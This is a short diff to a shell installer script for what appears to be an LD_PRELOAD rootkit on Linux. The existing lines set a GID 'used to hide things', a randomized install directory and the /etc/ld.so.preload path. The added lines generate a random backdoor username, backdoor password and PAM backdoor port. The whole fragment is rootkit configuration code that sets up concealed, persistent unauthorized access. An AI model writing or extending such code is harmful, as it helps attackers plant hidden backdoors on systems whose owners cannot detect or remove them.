@@ -25,6 +25,10 @@ fi
 
 [ -z $DIRDEPTH ] && DIRDEPTH=2
 
+[ -z $BD_UNAME ] && BD_UNAME=`random 'a-z' 5`
+[ -z $BD_PWD ] && BD_PWD=`random 'a-zA-Z0-9' 8`
+[ -z $PAM_PORT ] && PAM_PORT=`random '1-9' 4`
+
 [ -z $MAGIC_GID ] && MAGIC_GID=`random '1-9' 3`               # GID used to hide things.
 [ -z $INSTALL_DIR ] && INSTALL_DIR="`random_path $DIRDEPTH`"  # installation directory.
 [ -z $LDSO_PRELOAD ] && LDSO_PRELOAD="/etc/ld.so.preload"     # preload file location.
